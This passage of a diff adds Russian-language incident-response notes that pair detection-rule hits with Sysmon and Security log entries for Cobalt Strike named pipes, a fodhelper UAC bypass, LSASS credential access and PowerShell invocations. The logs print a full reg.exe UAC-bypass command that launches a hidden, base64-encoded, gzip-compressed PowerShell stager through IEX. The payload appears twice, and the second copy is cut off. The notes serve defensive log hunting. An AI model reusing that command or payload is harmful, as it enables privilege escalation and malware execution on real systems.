+                ProcessGuid: D875E288-AAA2-64D4-7602-000000000300 
+                ProcessId: 3648 
+                RuleName: '-' 
+                User: DESKTOP-VQJOLVH\johndoe
+                UtcTime: 2023-08-10 09:15:14.114 
+
+                2023-08-10T09:23:15.768627+00:00,CobaltStrike Named Pipe;Potential Defense Evasion Via Raw Disk Access By UncommonTools,C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Windows\System32\winevt\Logs\Microsoft-WindowsSysmon%254Operational.evtx,1,Microsoft-Windows-Sysmon,18,3301,DESKTOP-VQJOLVH,"EventType: ConnectPipe
+                Image: \\127.0.0.1\ADMIN$\8ea5559.exe
+                PipeName: \MSSE-3332-server
+                ProcessGuid: D875E288-AC82-64D4-AA03-000000000300 
+                ProcessId: 7512 
+                RuleName: technique_id=T1021.002,technique_name=SMB/Windows Admin Shares
+                User: NT AUTHORITY\SYSTEM 
+                UtcTime: 2023-08-10 09:23:15.767 
+
+                2023-08-10T09:25:07.655908+00:00,CobaltStrike NamedPipe,C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Windows\System32\winevt\Logs\Microsoft-WindowsSysmon%254Operational.evtx,1,Microsoft-Windows-Sysmon,17,3548,DESKTOP-VQJOLVH,"EventType: CreatePipe
+                Image: C:\Windows\system32\rundll32.exe
+                PipeName: \postex_9778
+                ProcessGuid: D875E288-ACF3-64D4-B003-000000000300 
+                ProcessId: 6816 
+                RuleName: '-' 
+                User: NT AUTHORITY\SYSTEM 
+                UtcTime: 2023-08-10 09:25:07.653 
+
+        -   UAC (User Account Control) Bypass/Privilege Escalation by Abusing fodhelper.exe (ключевое слово - ProcessCreation и/или Process Creation)
+            Подобно об этой технике можно почитать тут  -   https://pentestlab.blog/2017/06/07/uac-bypassfodhelper/ 
+
+
+            2023-08-10T09:21:12.022956+00:00,Godmode Sigma Rule;PowerShell Base64 Encoded FromBase64String Cmdlet;PowerShellBase64 Encoded IEX Cmdlet;Suspicious PowerShell Invocations - Specific ProcessCreation,C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Windows\System32\winevt\Logs\Security.evtx,1,MicrosoftWindows-Security-Auditing,4688,5407,DESKTOP-VQJOLVH,"CommandLine: C:\Windows\system32\cmd.exe /C reg.exe addHKCU\Software\Classes\ms-settings\Shell\Open\command /d ""powershell -nop -w hidden -encodedcommandJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBMAFYAVwBhAFcALwBpAFMAaABiADkAbgBQAHcASwBmADIAZwBKAFUAQgBNAEcAYgBDAEQATgBHADcAWAAwAEQATQBiAHMAUwB5AEEAcwBkAGwANABVAGwAYwB1AEYASwBlAEsAMQBYAEEAYgBEAG0ALwBmAGYANQA1AGEAQgBkAEgAbwA2AFAAZABQAFMAegBFAFMASwBxAEgATABkADUAZABTADUAUwA5ADAANQA0AFgAZAB6AHoAaQBqAG0AbwA4AEEAbQAwAHQAMgBTAHMASgBnAEcAdgBpAFQAZgAzAG0ANABTAEgAMwBPAHgARgBvAHMAWABoAC8AQwBYAGsAQQBYADQAQgBkAGsAMgBJADMARQBzAC8AWABsADcATQAwAFUATQBlAFYATAArADAAeAA2AHgARgB5ACsAdwBFADUAYwBVAHAAVwB3AGoAQgBJAG0AZABNAEYASwA0AHUAYgBtADkAeQBUADQAbABmAG8AdwAyADUATQBWAEgAbgBPADcASgBpADAAZgA0AE4AcgBCAGoANgBhAHUAVQBmADEATABEAFUAQQBzADgAUgBQADMAbgAzADMANQByAEoAWQB3AFIAbgA1AC8AMwBwAFEANwBoAGEAaAB3AFQAegAzAEkAcABpAGYATQBGADYAUgAvAFMAYQBrAHMAWQB1AFoAdABZAE8ANABLADUAOQBLAGYAMAA2AGEAWABVAGMAUQBNAEwAdQBSAGUAeABZAHcAdgBoAEwAZAB4AEMAOQBXADEAeABOAGcAdwB3AEUAagBjAG8AegBVAE8AWAA4AG4AegB1AGoAegA5AHkAaABhAGUANwB5AG4ATwBwAEgAUwBYAEkAagBmAE8ANQArAFQASABtAHgAQwB2AFoAcgBwAHMAcgBTAEgAOABWAGgATQBQAEgAWQAwAGoAeQB1AFIASABGAEwASQBpAEQARABTACsAdABxAEsALwBJAHAAVQBXAEcAZgBwAHkAQgBIADUAMgB4ADUAdwBxAFgAbQB6AGsAaABnAG4AdgA4AC8ASgBMAEMANgBsAGsAbgBuADQAUABsAEYATABoAFIAegB4AHoAbQBpAHQASwBUADgAUABmADAALwBDAHoAOQAvAG8AWgBtAGwAdgBpAGMAZQBxAFQAVQA4AHoAbABoAFEAVABnAG4AYgBFADgAeABpAFUAdABkADUATgBzAHUAbQBaAEUATgBxAE8AVgBpAGkASgBuAHYANQBBAG8AQQBnAGgARwBlAE0ARgArADYAWQBnAEcAOQBmAGYAQgBLADgAcAAvADgAeABIAFcATABZAFAAZgBwAFYAKwAwACsANQA4AGYAawBjAEMAWAAzAFYANQBYAHkANwA1AFYAQQBhAHMAcABaAG8AWABqAEoAaQBWACsAaABZADUAVABsAHoAZABrAGMAWABPAGMASAA5AE8AKwBTAHEAdwBCAC8AUAB5AFIAWQA0AGYAYQB2AGoAMQBMAFYASgBpADUAeABFAEMAYwB2AEgAUABoADkAbAA2AHUAMwBOAHoAZABQADIAWgBMAEEAZgBmAEwAVABJAEsAYQBaADMAbABlAHAAWABKAFIARwBBAEEATAB4AGcAQgAxAEYATwBCADkAWgBRAGcAcgBQADMAKwBKAHoAZABuAHYAVgBqAEkAcwAvAE4AVgBTADUAYQBsADEAMAB6AHUARQA1ADQALwBnAHEAUABTADAARABhAGoALwBmADMAaABSAHUATAA5AGsAagB2AHIAOQBZAEMAWABWAHQAdwBzAFQANQB6ADYAdABCAEkAeAB2AHEARQArADMAbwBJADQALwBpAGEAOABMAG4AUAA0AG8AWgAyAGIAZwBrADQANgBOADAARgBSAHMARAB6AG4AegB1AGMAawBCAHMANwBjAEoATwBUAGgARAA2ADkASwBOAGEAMgA2AFAAOABUAGIAZAA1AEIAcQBkAGkAaQBIAHMATQBxAEMAQQBsAEMAdAArAEQATwBjAGMAdwBuACsAdgA1AEkAKwBJAEIAZgArAGMAOQBwAE8AbQBuAEQAWgBRAFoAdQBVAHAAZgBTAHUAdAA0ADkAUwA3ADIASQBwAGQAYgBMAG8AcgBqAG8AagBSAE4AbwBNADUAeABVAFoAbwBUADUAQgBLADcASwBLAGwAKwBUAEMAOQBIAGEAcwBLAEQAYgBKAG4ANwBCAG4AZQBVAHUASgB4AGkARgBQAE8AcgB1AGUAZgBDAEIANQBSAGUAWABMAGMAQwBIAHkAbwBtAHcAUgBCAGQAbwBPAEYAeABIAGgASgBNAGsAUwB0AFkASwBVAHAAZABhAHAAUABtAGMAVQA2AGQASwA0AFQAYwBoADUAeQAwAGsATwB0AEMAeQBZAEcAbABQAGMAUQBFAHYAZwBnAHUANQBsAHoAawBEAEwATwBMAC8ANQBvAGYAaABkAEsAYwA4AEoANABYAHUAcwBRAEQANgBhAHcATAA2AFMANQB5AG8ATwBkAGMASwBpAHAATABOACsAUQBRAE8ALwBkAHYAWQBGAC8AcgA1AEYAdwBVAGcAcQBzAHIAUwBlADkAQQBRAHcATABNADMAWQBBAFgAcABTAFYAbABIAFAAcABhAHIAdgBoAEQANAB2ADEAMwA4AEwANQB2AE0AZAAvAEIAYgBEAEYAeQBDAFcAUQArAEsAOABUAGUAQgBoAHIANgB1AFEAcwBBAE8AegBFADkAUQBUAE0AbQBrAGYAUwBsAEkARQByAHcAcQBYAG4AawBvAHAAWQB5AE0AMQBnADgATgAxAC8AZgBpAE0ANQBvAFoAUgB5AFUAZABCAFoANABUAFIAUwBUAGUAbgBXAGUAOQBiAGgAOABUAHAARQBUAEoAMgAxAE0AaAAvAFgAagBhAE4AZQBUACsAMABmAEQASAA2AGYAWQBYADcATAAyAFgAdQArAGcAKwBqAFoAOQBrAEoATQBBAFAAMwBJAFcAZABkAHMAYQA3AEcAZABZAGoAbQBPADMANAA0AGIAVwBkAGgAaQBoAGQATABqAGIAcABZADMAVwArAHQAaQBlAHEAdgBLAFEAMQBtAG0ATgA5AHAASgBoADgAKwBUAHIARgBIAHUAZwA5AHoAQQBKAGoARgBtAEQAOQBmAFoAagBQAFgARABqACsAMABGAEwAWAB5ADAAUQAzAFUAVwBaAHIAOABTAHIAVgB1AHcAMgBPAGcANQBQAHUATAA1AGwARQA1AGsARQB4AG0ARQBjADkAZgBaAFQAMQBWADcAdABjAGQAMABiAEIASABxAGQAZwArADQAeQBhAFMAYwBoAGEAeQBlAFQAcQBaAEUATQBvADYASABYAG8AOQBYAHQAWABsAHYAeQAvAHIANwBYACsAZABJAGQAeQBBAGIANgA0AGwAcgAzAEoATgBPADMASQArAEgATABpAEoAdwA5AEUAdgB0AFQAUQArAHgAcAAxAEMASgBNACsARABHAEEAZgBhAEoAVQA2AG0AVABWAHYAegBmADgAawBKAEoAVgA0AHAAdwBPAFkANAByAHQAawAwAGIAawBQAG4AeABQAGcAaABFAE8AWQAyAFYAOAB3AHAAdgBYADEAeAAwAEsASwA0AHYANQBhADIAWAB3AHUARABEAFgAdwBFADAARgBSAFUAeQAzADYAbQB4AHUAaABPADUAKwBxAFMANQBlAGwAYQBuAEoATQBtAHgANwBIAFQAQwBPAEIAVQA2AEsANQBmADcASgBDAEYAOQBOAGUAeABtADEAbABhAG4AVgBXADMAUgBkAEYAaQBWADkANgBpAGwAdwA1ACsATgBGAHgAdQBzAGYANQAvAE0AbQAvAEEANQBNAGUAeABCADkAcQBkAGsAbgArAGQAZwBOAHEANgBqAE8ASwBIAEMAYQBnAHAAOQA3AHcAUwA5AGUAeABMAHYAZQBhAHUATABqAHQAVQA0ADkAdgBKAFcAMQAyAFEANAAzAHYAQwBTAHEAQQBlADUAcQBkADkAdwBmAHIARgBNAFcAOABUADYATAA5AG0ANQBVAG0AMAB5AHgAdwBKADMAcABDAGYAbQBIAHEAagB1AHAAZwBIAHgAawA3AFkAWQBEADkATABsAEgAUgB6AHYAVQBPAE0AWABEAEEAZABtAEwAOQBYAEcAcQBEAGQASgBqAGIAOQBmADcAawBqAFMARgBuAHQAWQB4AGoANQBZAGUANwAzAFQAdgAwAE0ASQBIAGMAdwBkADUAVQBOAFcAVgB4AG8AbQBzADQANQBWACsANABLAGYATgBRADcAQQB3AE8AdQBwAEEAMQA2AHQAZAAwAHcAcwBkAHcAMgA5AFAAYwBOAGUAbQAxAHMAcQBtAGUASQBVAG4AaABsAGQAUgBrAEwAOABFADMAKwBaAEIAOAAyADAAUABkAC8ASABFAFgASQBWADcAMAArAGwAMQAwAFcASABMAFcAdgBQAFIAeQBsAEwANwBwAHkAWQBkAHkANAB1ADIATwBkAE8AOABmAG4AdgAyAFcAbABsADMASABzAGIASgBvACsANABPAEgAcwB1AE4AbAB0AFkAMAB4AHUAMwBEAGEAUABqAFEAVABpAGUATABjAG4AOAA5AGYAOQBXAG4AcwA2ADIAagBXAFgANAB6AE0AcAAwAFIAMABtAFkAagBRADEAVgBtAEUAQQA5ADcAdABOAFIAVgB6AFYAcABqAFQAWAA4AG8AegB6AHYAcQBXAEYAawBzAHcAcQA2AHcAbAA5AGwASQBIAGMAMQBZAHAAWgBHADUARABRAHoAVABxADgAaQA0AFUAegBzAFkAbgBUAFIAcAAwAFcAcgBZAFMAOAAxAFkAOQBVAGMAZABBACsASgBFAG0AdgBiAGYAcwBPAEwAZQA2ADEAcwA4AHgARQBwADUAbwBIAGUAYQBUAG0AcwA3AEkAMAAzAFoAagBJAHgATwBQADkAWAA4AHAAZwBMADMAOABnADEAZgA5AHcARQB2AHQAKwBXAHcAZwBuAHgAZAB4AG0AcABOAE0AZQBGAE0AOAA1AGEAUgBKAFIAdQB0AHAAaAB6ADMAMABPAEgAMQAvADgAKwBkAEIANwBtAHEATwBPAHUATgBNAHEANgBSADEARgBpADMAbABIAEUARAA4AEQAcQBHAEcAaQB6AFcAagB1ADAAaABEADMATABxAG8AWABhAHcANQBUADQAMwA1AFgANQBxAEgAbQByAFUAVwB0AHUAUgB2AFEAcABUADIAMQBjAG4AdABtAHcAZQA3AEUAUABOAFIAVgA3AEQAVQB4ADIAYgB0AFQAcAB4AC8AOABMAEgAegBnAGkAVgBSAHoAZgBRAEsAKwBlAGMAagBrAHoASQBWAGEAagBSAGcAZABVADcAaQBWAG8AZABJAEMATwByADIAWQBGAEoAcQB2AFkAaAA1AFMAYwBaADMAVABjAFAAdQBKAE4ARQBLAGYAeQBYAEkAUwBjAC8AcgAwAEQAMgBJAEcAUwBpAFMASQBhADgASABsAG0AcgA2AEEAQgA1AGoAZQBxAGEAcgA5AGEAdAAzAGIASwAyADEASwBQAFcAagBQAFcAUwBGAHQAUwA5AFYAUwBZAEsAdgAwAGQASABBADIAcABpAHQATQBPAGYAdABlAEYAKwBmAEkAKwBWAGQAcQBPAHoAcgBEAFQAYgBqADIAMgArAGUAbAB6AGkAOABhAEkAZAByAG0AZAAwAGwATQBsAGsAcgBYAEkAVABNAEoAaAArAFUAagBGAFIALwBGADIAQwAzAHoAdQBYAFMAMgA4AE4ARAA5AG8AYwB0AEYAZgB4AC8AZgBQAG4AcgBDAFgAZQB2AEIAMAA5AGYAVQBxAGYAcgAyAFAAawAyAC8ANwBPAFMAcwBHAGMAVQByAHUAOQArAGUAcwA2AEwAKwB6AFIAdQA2ADcANQBzACsAbABzAGgARgBpADgAUgBTADUAMABVADUAaQB3AHIAdQArAGoASABqAEQAOQBNAGkAZABOAEEAeQBvADAAOAB2AG0AUABSAC8AdABYAHcAbgB6AGkAdwB0AGcATABnAC8ASAAxAFYAVgBGAGQATgA4AEIAaQBzAHYAdgBKAGkAUABYADcAVwA5ACsASAAxADMATQBCAFMAMABYACsAYwBGAFgANAA5AGsAQQBVAEMAdABlAG4AegAwAG8AMgBtADIAegA4AHUAVgB6AHgATwBnAFYAKwBlADAAcABNAHUARgAvAHgASABaAEYARAA0AGoAdAA4AFcANQBUAEsAcQBWAEkAdQBsADgAVgB2AHQAUQB6AFcAZgBwADIAWQBWAGgAQQBlADgAMgAvADIAaQBtAEwAKwBlAHcAZgBsAHYAUwBzADMAYwAvAFUAMgBzAEwASABFADkAOABqAC8ATQBBAGIAZgBlAGYAMwBQADcAQQByACsAcwBoAG4AeQBHADMAcwBaAG8AbwA4AHAARQA0AC8AeQBQAHcASAA0AGIAWQB6AFoANAB3ADAAQQBBAEEAPQA9ACIAKQApADsASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBHAHoAaQBwAFMAdAByAGUAYQBtACgAJABzACwAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsA"" /fMandatoryLabel: S-1-16-8192NewProcessId: '0xca0'
+            NewProcessName: C:\Windows\System32\cmd.exeParent
+            ProcessName: C:\Windows\System32\rundll32.exe
+            ProcessId: '0xe40' 
+            SubjectDomainName: DESKTOP-VQJOLVH
+            SubjectLogonId: '0x20118'
+            SubjectUserName: johndoe
+            SubjectUserSid: S-1-5-21-414731039-2985344906-4266326170-1000
+            TargetDomainName: '-'
+            TargetLogonId: '0x0'
+            TargetUserName: '-'
+            TargetUserSid: S-1-0-0
+            TokenElevationType: '%%1938' 
+
+            2023-08-10T09:21:16.211891+00:00,UNC2452 Process CreationPatterns,C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Windows\System32\winevt\Logs\Microsoft-WindowsSysmon%254Operational.evtx,1,Microsoft-Windows-Sysmon,1,2568,DESKTOP-VQJOLVH,"CommandLine:C:\Windows\system32\cmd.exe /C C:\Windows\system32\fodhelper.exe
+            Company: Microsoft Corporation
+            CurrentDirectory: C:\Users\johndoe\AppData\Local\
+            Description: Windows Command Processor
+            FileVersion: 10.0.19041.746 (WinBuild.160101.0800)
+            Hashes: SHA1=F1EFB0FDDC156E4C61C5F78A54700E4E7984D55D,MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18
+            Image: C:\Windows\System32\cmd.exe
+            IntegrityLevel: Medium
+            LogonGuid: D875E288-2DE1-64D4-1801-020000000000
+            LogonId: '0x20118'
+            OriginalFileName: Cmd.Exe
+            ParentCommandLine: '""C:\Windows\System32\rundll32.exe"" payload.dll,StartW'
+            ParentImage: C:\Windows\System32\rundll32.exe
+            ParentProcessGuid: 00000000-0000-0000-0000-000000000000 
+            ParentProcessId: 3648 
+            ParentUser: '-' 
+            ProcessGuid: D875E288-AC0C-64D4-C402-000000000300 
+            ProcessId: 736 
+            Product: Microsoft® Windows® Operating System
+            RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
+            TerminalSessionId: 1 
+            User: DESKTOP-VQJOLVH\johndoe
+            UtcTime: 2023-08-10 09:21:16.210
+
+        -   LSASS Access 
+
+            2023-08-10T09:25:08.136679+00:00,Mimikatz Detection LSASS Access;Suspicious In-Memory ModuleExecution,C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Windows\System32\winevt\Logs\Microsoft-WindowsSysmon%254Operational.evtx,1,Microsoft-Windows-Sysmon,10,3552,DESKTOP-VQJOLVH,"CallTrace:C:\Windows\SYSTEM32\ntdll.dll+9d524|C:\Windows\System32\KERNELBASE.dll+308ee|UNKNOWN(0000022D8024D798)
+            GrantedAccess: '0x1010' 
+            RuleName: technique_id=T1003,technique_name=Credential Dumping
+            SourceImage: C:\Windows\system32\rundll32.exe
+            SourceProcessGUID: D875E288-ACF3-64D4-B003-000000000300 
+            SourceProcessId: 6816 
+            SourceThreadId: 7412 
+            SourceUser: NT AUTHORITY\SYSTEM 
+            TargetImage: C:\Windows\system32\lsass.exe
+            TargetProcessGUID: D875E288-2DE0-64D4-0C00-000000000300
+            TargetProcessId: 660
+            TargetUser: NT AUTHORITY\SYSTEM
+            UtcTime: 2023-08-10 09:25:08.129 
+
+        -   Windows PowerShell Execution/Invocations
+            *** Тут надо быть аккуратным, так как количество совпадений по ключевому слову powershell модетбыть большим
+                Поэтому рекомендуется добавлять другие слова к слову powershell (к примеру execution илиinvocations) 
+
+            2023-08-10T09:21:12.022956+00:00,Godmode Sigma Rule;PowerShell Base64 Encoded FromBase64String Cmdlet;PowerShellBase64 Encoded IEX Cmdlet;Suspicious PowerShell Invocations - Specific ProcessCreation,C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Windows\System32\winevt\Logs\Security.evtx,1,MicrosoftWindows-Security-Auditing,4688,5407,DESKTOP-VQJOLVH,"CommandLine: C:\Windows\system32\cmd.exe /C reg.exe addHKCU\Software\Classes\ms-settings\Shell\Open\command /d ""powershell -nop -w hidden -encodedcommandJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBMAFYAVwBhAFcALwBpAFMAaABiADkAbgBQAHcASwBmADIAZwBKAFUAQgBNAEcAYgBDAEQATgBHADcAWAAwAEQATQBiAHMAUwB5AEEAcwBkAGwANABVAGwAYwB1AEYASwBlAEsAMQBYAEEAYgBEAG0ALwBmAGYANQA1AGEAQgBkAEgAbwA2AFAAZABQAFMAegBFAFMASwBxAEgATABkADUAZABTADUAUwA5ADAANQA0AFgAZAB6AHoAaQBqAG0AbwA4AEEAbQAwAHQAMgBTAHMASgBnAEcAdgBpAFQAZgAzAG0ANABTAEgAMwBPAHgARgBvAHMAWABoAC8AQwBYAGsAQQBYADQAQgBkAGsAMgBJADMARQBzAC8AWABsADcATQAwAFUATQBlAFYATAArADAAeAA2AHgARgB5ACsAdwBFADUAYwBVAHAAVwB3AGoAQgBJAG0AZABNAEYASwA0AHUAYgBtADkAeQBUADQAbABmAG8AdwAyADUATQBWAEgAbgBPADcASgBpADAAZgA0AE4AcgBCAGoANgBhAHUAVQBmADEATABEAFUAQQBzADgAUgBQADMAbgAzADMANQByAEoAWQB3AFIAbgA1AC8AMwBwAFEANwBoAGEAaAB3AFQAegAzAEkAcABpAGYATQBGADYAUgAvAFMAYQBrAHMAWQB1AFoAdABZAE8ANABLADUAOQBLAGYAMAA2AGEAWABVAGMAUQBNAEwAdQBSAGUAeABZAHcAdgBoAEwAZAB4AEMAOQBXADEAeABOAGcAdwB3AEUAagBjAG8AegBVAE8AWAA4AG4AegB1AGoAegA5AHkAaABhAGUANwB5AG4ATwBwAEgAUwBYAEkAagBmAE8ANQArAFQASABtAHgAQwB2AFoAcgBwAHMAcgBTAEgAOABWAGgATQBQAEgAWQAwAGoAeQB1AFIASABGAEwASQBpAEQARABTACsAdABxAEsALwBJAHAAVQBXAEcAZgBwAHkAQgBIADUAMgB4ADUAdwBxAFgAbQB6AGsAaABnAG4AdgA4AC8ASgBMAEMANgBsAGsAbgBuADQAUABsAEYATABoAFIAegB4AHoAbQBpAHQASwBUADgAUABmADAALwBDAHoAOQAvAG8AWgBtAGwAdgBpAGMAZQBxAFQAVQA4AHoAbABoAFEAVABnAG4AYgBFADgAeABpAFUAdABkADUATgBzAHUAbQBaAEUATgBxAE8AVgBpAGkASgBuAHYANQBBAG8AQQBnAGgARwBlAE0ARgArADYAWQBnAEcAOQBmAGYAQgBLADgAcAAvADgAeABIAFcATABZAFAAZgBwAFYAKwAwACsANQA4AGYAawBjAEMAWAAzAFYANQBYAHkANwA1AFYAQQBhAHMAcABaAG8AWABqAEoAaQBWACsAaABZADUAVABsAHoAZABrAGMAWABPAGMASAA5AE8AKwBTAHEAdwBCAC8AUAB5AFIAWQA0AGYAYQB2AGoAMQBMAFYASgBpADUAeABFAEMAYwB2AEgAUABoADkAbAA2AHUAMwBOAHoAZABQADIAWgBMAEEAZgBmAEwAVABJAEsAYQBaADMAbABlAHAAWABKAFIARwBBAEEATAB4AGcAQgAxAEYATwBCADkAWgBRAGcAcgBQADMAKwBKAHoAZABuAHYAVgBqAEkAcwAvAE4AVgBTADUAYQBsADEAMAB6AHUARQA1ADQALwBnAHEAUABTADAARABhAGoALwBmADMAaABSAHUATAA5AGsAagB2AHIAOQBZAEMAWABWAHQAdwBzAFQANQB6ADYAdABCAEkAeAB2AHEARQArADMAbwBJADQALwBpAGEAOABMAG4AUAA0AG8AWgAyAGIAZwBrADQANgBOADAARgBSAHMARAB6AG4AegB1AGMAawBCAHMANwBjAEoATwBUAGgARAA2ADkASwBOAGEAMgA2AFAAOABUAGIAZAA1AEIAcQBkAGkAaQBIAHMATQBxAEMAQQBsAEMAdAArAEQATwBjAGMAdwBuACsAdgA1AEkAKwBJAEIAZgArAGMAOQBwAE8AbQBuAEQAWgBRAFoAdQBVAHAAZgBTAHUAdAA0ADkAUwA3ADIASQBwAGQAYgBMAG8AcgBqAG8AagBSAE4AbwBNADUAeABVAFoAbwBUADUAQgBLADcASwBLAGwAKwBUAEMAOQBIAGEAcwBLAEQAYgBKAG4ANwBCAG4AZQBVAHUASgB4AGkARgBQAE8AcgB1AGUAZgBDAEIANQBSAGUAWABMAGMAQwBIAHkAbwBtAHcAUgBCAGQAbwBPAEYAeABIAGgASgBNAGsAUwB0AFkASwBVAHAAZABhAHAAUABtAGMAVQA2AGQASwA0AFQAYwBoADUAeQAwAGsATwB0AEMAeQBZAEcAbABQAGMAUQBFAHYAZwBnAHUANQBsAHoAawBEAEwATwBMAC8ANQBvAGYAaABkAEsAYwA4AEoANABYAHUAcwBRAEQANgBhAHcATAA2AFMANQB5AG8ATwBkAGMASwBpAHAATABOACsAUQBRAE8ALwBkAHYAWQBGAC8AcgA1AEYAdwBVAGcAcQBzAHIAUwBlADkAQQBRAHcATABNADMAWQBBAFgAcABTAFYAbABIAFAAcABhAHIAdgBoAEQANAB2ADEAMwA4AEwANQB2AE0AZAAvAEIAYgBEAEYAeQBDAFcAUQArAEsAOABUAGUAQgBoAHIANgB1AFEAcwBBAE8AegBFADkAUQBUAE0AbQBrAGYAUwBsAEkARQByAHcAcQBYAG4AawBvAHAAWQB5AE0AMQBnADgATgAxAC8AZgBpAE0ANQBvAFoAUgB5AFUAZABCAFoANABUAFIAUwBUAGUAbgBXAGUAOQBiAGgAOABUAHAARQBUAEoAMgAxAE0AaAAvAFgAagBhAE4AZQBUACsAMABmAEQASAA2AGYAWQBYADcATAAyAFgAdQArAGcAKwBqAFoAOQBrAEoATQBBAFAAMwBJAFcAZABkAHMAYQA3AEcAZABZAGoAbQBPADMANAA0AGIAVwBkAGgAaQBoAGQATABqAGIAcABZADMAVwArAHQAaQBlAHEAdgBLAFEAMQBtAG0ATgA5AHAASgBoADgAKwBUAHIARgBIAHUAZwA5AHoAQQBKAGoARgBtAEQAOQBmAFoAagBQAFgARABqACsAMABGAEwAWAB5ADAAUQAzAFUAVwBaAHIAOABTAHIAVgB1AHcAMgBPAGcANQBQAHUATAA1AGwARQA1AGsARQB4AG0ARQBjADkAZgBaAFQAMQBWADcAdABjAGQAMABiAEIASABxAGQAZwArADQAeQBhAFMAYwBoAGEAeQBlAFQAcQBaAEUATQBvADYASABYAG8AOQBYAHQAWABsAHYAeQAvAHIANwBYACsAZABJAGQAeQBBAGIANgA0AGwAcgAzAEoATgBPADMASQArAEgATABpAEoAdwA5AEUAdgB0AFQAUQArAHgAcAAxAEMASgBNACsARABHAEEAZgBhAEoAVQA2AG0AVABWAHYAegBmADgAawBKAEoAVgA0AHAAdwBPAFkANAByAHQAawAwAGIAawBQAG4AeABQAGcAaABFAE8AWQAyAFYAOAB3AHAAdgBYADEAeAAwAEsASwA0AHYANQBhADIAWAB3AHUARABEAFgAdwBFADAARgBSAFUAeQAzADYAbQB4AHUAaABPADUAKwBxAFMANQBlAGwAYQBuAEoATQBtAHgANwBIAFQAQwBPAEIAVQA2AEsANQBmADcASgBDAEYAOQBOAGUAeABtADEAbABhAG4AVgBXADMAUgBkAEYAaQBWADkANgBpAGwAdwA1ACsATgBGAHgAdQBzAGYANQAvAE0AbQAvAEEANQBNAGUAeABCADkAcQBkAGsAbgArAGQAZwBOAHEANgBqAE8ASwBIAEMAYQBnAHAAOQA3AHcAUwA5AGUAeABMAHYAZQBhAHUATABqAHQAVQA0ADkAdgBKAFcAMQAyAFEANAAzAHYAQwBTAHEAQQBlADUAcQBkADkAdwBmAHIARgBNAFcAOABUADYATAA5AG0ANQBVAG0AMAB5AHgAdwBKADMAcABDAGYAbQBIAHEAagB1AHAAZwBIAHgAawA3AFkAWQBEADkATABsAEgAUgB6AHYAVQBPAE0AWABEAEEAZABtAEwAOQBYAEcAcQBEAGQASgBqAGIAOQBmADcAawBqAFMARgBuAHQAWQB4AGoANQBZAGUANwAzAFQAdgAwAE0ASQBIAGMAdwBkADUAVQBOAFcAVgB4AG8AbQBzADQANQBWACsANABLAGYATgBRADcAQQB3AE8AdQBwAEEAMQA2AHQAZAAwAHcAcwBkAHcAMgA5AFAAYwBOAGUAbQAxAHMAcQBtAGUASQBVAG4AaABsAGQAUgBrAEwAOABFADMAKwBaAEIAOAAyADAAUABkAC8ASABFAFgASQBWADcAMAArAGwAMQAwAFcASABMAFcAdgBQAFIAeQBsAEwANwBwAHkAWQBkAHkANAB1ADIATwBkAE8AOABmAG4AdgAyAFcAbABsADMASABzAGIASgBvACsANABPAEgAcwB1AE4AbAB0AFkAMAB4AHUAMwBEAGEAUABqAFEAVABpAGUATABjAG4AOAA5AGYAOQBXAG4AcwA2ADIAagBXAFgANAB6AE0AcAAwAFIAMABtAFkAagBRADEAVgBtAEUAQQA5ADcAdABOAFIAVgB6AFYAcABqAFQAWAA4AG8AegB6AHYAcQBXAEYAawBzAHcAcQA2AHcAbAA5AGwASQBIAGMAMQBZAHAAWgBHADUARABRAHoAVABxADgAaQA0AFUAegBzAFkAbgBUAFIAcAAwAFcAcgBZAFMAOAAxAFkAOQBVAGMAZABBACsASgBFAG0AdgBiAGYAcwBPAEwAZQA2ADEAcwA4AHgARQBwADUAbwBIAGUAYQBUAG0AcwA3AEkAMAAzAFoAagBJAHgATwBQADkAWAA4AHAAZwBMADMAOABnADEAZgA5AHcARQB2AHQAKwBXAHcAZwBuAHgAZAB4AG0AcABOAE0AZQBGAE0AOAA1AGEAUgBKAFIAdQB0AHAAaAB6ADMAMABPAEgAMQAvADgAKwBkAEIANwBtAHEATwBPAHUATgBNAHEANgBSADEARgBpADMAbABIAEUARAA4AEQAcQBHAEcAaQB6AFcAagB1ADAAaABEADMATABxAG8AWABhAHcANQBUADQAMwA1AFgANQBxAEgAbQByAFUAVwB0AHUAUgB2AFEAcABUADIAMQBjAG4AdABtAHcAZQA3AEUAUABOAFIAVgA3AEQAVQB4ADIAYgB0AFQAcAB4AC8AOABMAEgAegBnAGkAVgBSAHoAZgBRAEsAKwBlAGMAagBrAHoASQBWAGEAagBSAGcAZABVADcAaQBWAG8AZABJAEMATwByADIAWQBGAEoAcQB2AFkAaAA1AFMAYwBaADMAVABjAFAAdQBKAE4ARQBLAGYAeQBYAEkAUwBjAC8AcgAwAE